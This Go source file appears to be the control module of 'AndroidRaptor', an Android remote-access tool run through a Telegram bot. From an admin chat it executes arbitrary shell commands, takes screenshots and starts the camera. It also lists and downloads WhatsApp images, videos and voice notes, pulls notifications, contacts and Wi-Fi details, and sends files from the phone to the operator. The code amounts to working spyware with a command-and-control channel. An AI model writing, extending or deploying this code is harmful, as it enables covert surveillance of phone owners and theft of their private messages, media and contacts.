package manager

import (
	"context"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"time"

	"github.com/elieser9001/AndroidRaptor/android"
	"github.com/elieser9001/AndroidRaptor/whatsapp"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

type FileType string

// TELEGRAM FILE STRUCT
type File struct {
	Type    FileType
	Path    string
	AdminID int64
}

// ACTIONS CONSTS
const (
	START                    = "start"
	STATUS                   = "status"
	SCREEN_CAPTURE           = "ss"
	TURN_SCREEN_OFF          = "soff"
	TURN_SCREEN_ON           = "son"
	EXECUTE_COMMAND          = "sh"
	GET_WHATSAPP_ALL_MEDIA   = "wsm"
	GET_WHATSAPP_IMAGES      = "wsi"
	GET_WHATSAPP_IMAGES_SENT = "wsis"
	GET_WHATSAPP_VIDEOS_SENT = "wsvs"
	GET_WHATSAPP_VIDEOS      = "wsv"
	GET_WHATSAPP_STATUSES    = "wss"
	GET_WHATSAPP_VOICE_NOTES = "wsvn"
	GET_PHOTO                = "getp"
	GET_VIDEO                = "getv"
	GET_AUDIO                = "ga"
	GET_DOCUMENT             = "gd"
	OPEN_URL                 = "url"
	START_CAMERA             = "cam"
	GET_NOTIFICATIONS        = "not"
	GET_USER_APPS_LIST       = "ua"
	GET_GOOGLE_CONTACTS      = "gc"
	GET_WIFI_IP              = "wfi"
	GET_WIFI_MAC             = "wfm"
	GET_WIFI_SSID            = "wfs"
	GET_CURRENT_ACTIVITY     = "ca"
	GET_CURRENT_PACKAGE_NAME = "cp"
	CLOSE_APP                = "capp"
	CLOSE_CURRENT_APP        = "ccapp"
	IS_SCREEN_ON             = "isson"
	SWIPE_UP                 = "sup"
	GET_BATTERY_LEVEL        = "getbl"
	SHUTDOWN_MOBILE          = "shutdown"
	REBOOT_MOBILE            = "reboot"
	HELP                     = "help"
)

// ANDROID GLOBAL PATHS
const (
	ROOT_FOLDER             = "/data/local/tmp"
	CAPTURE_PNG_FULL_PATH   = ROOT_FOLDER + "/capture.png"
	CMD_RESULT_TEXT_PATH    = ROOT_FOLDER + "/cmdresult.txt"
	WHATSAPP_LIST_TEXT_PATH = ROOT_FOLDER + "/ws.txt"
)

// TELEGRAM FILE TYPES CONST
const (
	Picture  FileType = "picture"
	Audio    FileType = "audio"
	Video    FileType = "video"
	Document FileType = "document"
)

func loadFile(f File) (tgbotapi.Chattable, error) {
	photoBytes, err := os.ReadFile(f.Path)

	if len(photoBytes) <= 0 {
		return nil, fmt.Errorf("empty response")
	}

	if err != nil {
		return nil, err
	}

	fileBytes := tgbotapi.FileBytes{
		Name:  string(f.Type),
		Bytes: photoBytes,
	}

	switch f.Type {
	case Picture:
		return tgbotapi.NewPhoto(int64(f.AdminID), fileBytes), nil
	case Audio:
		return tgbotapi.NewAudio(int64(f.AdminID), fileBytes), nil
	case Video:
		return tgbotapi.NewVideo(int64(f.AdminID), fileBytes), nil
	case Document:
		return tgbotapi.NewDocument(int64(f.AdminID), fileBytes), nil
	default:
		return nil, fmt.Errorf("unknown file type")
	}
}

func sendFile(fType FileType, path string, adminId int64) (tgbotapi.Chattable, error) {
	f := File{
		Type:    fType,
		Path:    path,
		AdminID: adminId,
	}

	pcfg, err := loadFile(f)

	if err != nil {
		return nil, err
	}

	return pcfg, err
}

func SendAndroidCommand(adminId int64, f func(s string) error) (tgbotapi.Chattable, error) {
	if err := f(CMD_RESULT_TEXT_PATH); err != nil {
		return nil, err
	} else {
		file, err := sendFile(Document, CMD_RESULT_TEXT_PATH, adminId)

		if err != nil {
			return nil, err
		} else {
			return file, nil
		}
	}
}

func GetWhatsAppInfo(adminId int64, f func(s string) error) (tgbotapi.Chattable, error) {
	if err := f(WHATSAPP_LIST_TEXT_PATH); err != nil {
		return nil, err
	} else {
		file, err := sendFile(Document, WHATSAPP_LIST_TEXT_PATH, adminId)

		if err != nil {
			return nil, err
		} else {
			return file, nil
		}
	}
}

func HTTPClientWithCustomDNS() http.Client {
	// source: http://www.koraygocmen.com/blog/custom-dns-resolver-for-the-default-http-client-in-go

	var (
		dnsResolverIP        = "8.8.8.8:53"
		dnsResolverProto     = "udp"
		dnsResolverTimeoutMs = 5000
	)

	dialer := &net.Dialer{
		Resolver: &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				d := net.Dialer{
					Timeout: time.Duration(dnsResolverTimeoutMs) * time.Millisecond,
				}
				return d.DialContext(ctx, dnsResolverProto, dnsResolverIP)
			},
		},
	}

	dialContext := func(ctx context.Context, network, addr string) (net.Conn, error) {
		return dialer.DialContext(ctx, network, addr)
	}

	http.DefaultTransport.(*http.Transport).DialContext = dialContext
	httpClient := &http.Client{}

	return *httpClient
}

func Start(adminId int64, apiBotKey string) {
	client := HTTPClientWithCustomDNS()

	bot, err := tgbotapi.NewBotAPIWithClient(apiBotKey, tgbotapi.APIEndpoint, &client)

	if err != nil {
		fmt.Println(err)
	}

	bot.Debug = false

	log.Printf("Authorized on account %s", bot.Self.UserName)

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := bot.GetUpdatesChan(u)

	help := `
		Android Raptor Commands

		/status => ping/pong like
		/ss   	=> Capture And Download Live Screen Capture
		/soff   => Turning Screen Off
		/son    => Turning Screen On
		/sh (any valid shell command [with params]) => Execute Shell Command (ex: ls -la /sdcard/)
		/wsm => Getting All WhatsApp Media Info
		/wsi => Getting WhatsApp Images Info
		/wsis => Getting WhatsApp Images Sent Info
		/wsvs => Getting WhatsApp Videos Sent Info
		/wsv => Getting WhatsApp Videos Info
		/wss => Getting WhatsApp Statuses Info
		/wsvn => Getting WhatsApp Voice Notes Info
		/getp (full path photo) => Download Any Photo From Remote Device
		/getv (full path video) => Download Any Video From Remote Device
		/getd (full path document) => Download Any Document From Remote Device
		/url (https://anyvalidurl.com) => Open An URL In Remote Device Default Browser
		/cam => Start Camera In Remote Device
		/not => Getting All Notifications From Remote Device
		/ua => Getting All Applications Installed By The User
		/gc => Getting All Google Contacts From Remote Device 
		/wfi => Getting Wifi IP From Remote Device 
		/wfm => Getting Wifi IP From Remote Device 
		/wfi => Getting Wifi MAC Address From Remote Device 
		/wfs => Getting Wifi SSID Name From Remote Device
		/ca => Getting Current Active Activity
		/cp => Getting Current Active Package Name
		/capp (package name) => Close App
		/isson => Know If The Screen Is On
		/sup => Send Swipe Up Gesture
		/getbl => Getting Current Battery Percentage Level
		/shutdown => Shutdown The Remote Device
		/reboot => Reboot The Remote Device
	`

	for update := range updates {
		if update.Message.IsCommand() && update.Message != nil && update.Message.Chat.ID == adminId {
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)

			param := update.Message.CommandArguments()

			switch update.Message.Command() {
			case HELP, START:
				msg.Text = help

			case GET_PHOTO:
				f, err := sendFile(Picture, param, adminId)

				if err != nil {
					msg.Text = err.Error()
				} else {
					bot.Send(f)
				}

			case GET_VIDEO:
				f, err := sendFile(Video, param, adminId)

				if err != nil {
					msg.Text = err.Error()
				} else {
					bot.Send(f)
				}

			case GET_AUDIO:
				f, err := sendFile(Audio, param, adminId)

				if err != nil {
					msg.Text = err.Error()
				} else {
					bot.Send(f)
				}

			case GET_DOCUMENT:
				f, err := sendFile(Document, param, adminId)

				if err != nil {
					msg.Text = err.Error()
				} else {
					bot.Send(f)
				}

			case EXECUTE_COMMAND:
				fmt.Println("timeout 5 " + update.Message.CommandArguments() + " > " + CMD_RESULT_TEXT_PATH)

				_, err := android.ExecuteCommand("timeout 5 " + update.Message.CommandArguments() + " > " + CMD_RESULT_TEXT_PATH)

				if err != nil {
					msg.Text = err.Error()
				}

				f, err := sendFile(Document, CMD_RESULT_TEXT_PATH, adminId)

				if err != nil {
					msg.Text = err.Error()
				} else {
					bot.Send(f)
				}

			case TURN_SCREEN_OFF:
				if err := android.TurnScreenOFF(); err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = "Screen Off"
				}

			case TURN_SCREEN_ON:
				if err := android.TurnScreenOn(); err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = "Screen On"
				}

			case STATUS:
				msg.Text = "I'm Ready 😎"

			case SCREEN_CAPTURE:
				if err := android.GetScreenshot(CAPTURE_PNG_FULL_PATH); err != nil {
					msg.Text = err.Error()
				} else {
					f, err := sendFile(Picture, CAPTURE_PNG_FULL_PATH, adminId)

					if err != nil {
						msg.Text = err.Error()
					} else {
						bot.Send(f)
					}
				}

			case GET_WHATSAPP_ALL_MEDIA:
				if err := whatsapp.GetWhatsAppAllMediaFiles(WHATSAPP_LIST_TEXT_PATH); err != nil {
					msg.Text = err.Error()
				} else {
					f, err := sendFile(Document, WHATSAPP_LIST_TEXT_PATH, adminId)

					if err != nil {
						msg.Text = err.Error()
					} else {
						bot.Send(f)
					}
				}
			case GET_WHATSAPP_IMAGES:
				f, err := GetWhatsAppInfo(
					adminId,
					whatsapp.GetWhatsAppImages,
				)

				if err != nil {
					msg.Text = err.Error()
				} else {
					bot.Send(f)
				}

			case GET_WHATSAPP_IMAGES_SENT:
				f, err := GetWhatsAppInfo(
					adminId,
					whatsapp.GetWhatsAppImgSent,
				)

				if err != nil {
					msg.Text = err.Error()
				} else {
					bot.Send(f)
				}

			case GET_WHATSAPP_VIDEOS_SENT:
				f, err := GetWhatsAppInfo(
					adminId,
					whatsapp.GetWhatsAppVideoSent,
				)

				if err != nil {
					msg.Text = err.Error()
				} else {
					bot.Send(f)
				}

			case GET_WHATSAPP_VIDEOS:
				f, err := GetWhatsAppInfo(
					adminId,
					whatsapp.GetWhatsAppVideos,
				)

				if err != nil {
					msg.Text = err.Error()
				} else {
					bot.Send(f)
				}

			case GET_WHATSAPP_STATUSES:
				f, err := GetWhatsAppInfo(
					adminId,
					whatsapp.GetWhatsAppStatuses,
				)

				if err != nil {
					msg.Text = err.Error()
				} else {
					bot.Send(f)
				}

			case GET_WHATSAPP_VOICE_NOTES:
				f, err := GetWhatsAppInfo(
					adminId,
					whatsapp.GetWhatsappVoiceNotes,
				)

				if err != nil {
					msg.Text = err.Error()
				} else {
					bot.Send(f)
				}

			case OPEN_URL:
				if err := android.OpenURL(param); err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = "Done!"
				}

			case START_CAMERA:
				err := android.StartCamera()

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = "Done!"
				}

			case GET_NOTIFICATIONS:
				f, err := SendAndroidCommand(
					adminId,
					android.GetNotifications,
				)

				if err != nil {
					msg.Text = err.Error()
				} else {
					bot.Send(f)
				}

			case GET_USER_APPS_LIST:
				f, err := SendAndroidCommand(
					adminId,
					android.GetUserAppsList,
				)

				if err != nil {
					msg.Text = err.Error()
				} else {
					bot.Send(f)
				}

			case GET_GOOGLE_CONTACTS:
				f, err := SendAndroidCommand(
					adminId,
					android.GetGoogleContacts,
				)

				if err != nil {
					msg.Text = err.Error()
				} else {
					bot.Send(f)
				}

			case GET_WIFI_IP:
				r, err := android.GetWifiIP()

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = r
				}

			case GET_WIFI_MAC:
				r, err := android.GetWifiMAC()

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = r
				}

			case GET_WIFI_SSID:
				r, err := android.GetWifiSSID()

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = r
				}

			case GET_CURRENT_ACTIVITY:
				r, err := android.GetCurrentActivity()

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = r
				}

			case GET_CURRENT_PACKAGE_NAME:
				r, err := android.GetCurrentPacketName()

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = r
				}

			case GET_BATTERY_LEVEL:
				r, err := android.GetBatteryLevel()

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = strconv.Itoa(r) + "%"
				}

			case CLOSE_APP:
				err := android.CloseApp(param)

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = "Done!"
				}

			case CLOSE_CURRENT_APP:
				err := android.CloseCurrentApp()

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = "Done!"
				}

			case SWIPE_UP:
				err := android.SwipeUp()

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = "Done!"
				}

			case SHUTDOWN_MOBILE:
				err := android.Shutdown()

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = "Done!"
				}

			case REBOOT_MOBILE:
				err := android.Shutdown()

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = "Done!"
				}

			case IS_SCREEN_ON:
				isOn, err := android.IsScreenOn()

				if err != nil {
					msg.Text = err.Error()
				} else {
					if isOn {
						msg.Text = "Screen is on"
					} else {
						msg.Text = "Screen is off"
					}
				}

			default:
				msg.Text = "Unknown Command 🤔"
			}

			if _, err := bot.Send(msg); err != nil {
				fmt.Println(err)
			}
		}

	}
}
